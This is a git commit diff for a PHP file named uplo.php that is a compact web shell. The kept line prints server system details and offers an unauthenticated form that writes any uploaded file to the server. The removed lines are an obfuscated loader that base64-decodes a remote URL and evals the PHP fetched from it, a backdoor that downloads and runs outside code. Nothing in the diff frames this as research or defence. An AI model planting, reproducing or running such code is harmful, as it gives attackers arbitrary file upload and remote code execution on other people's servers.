7d2974784ee7df9762b8bcb6ff6f527afd82d5bf
sidhelchor <59345265+sidhelchor@users.noreply.github.com>
2023-07-08 14:55:28 +0600

    Update uplo.php

--- uplo.php
+++ uplo.php
@@ -1,5 +1,1 @@
 <?php echo '<pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
-<?php /*
-*/
-eval(base64_decode('Pz4=').file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpZGhlbGNob3Ivc2lkaGVsL21hc3Rlci9kb29yLnBocA==')));
-?>
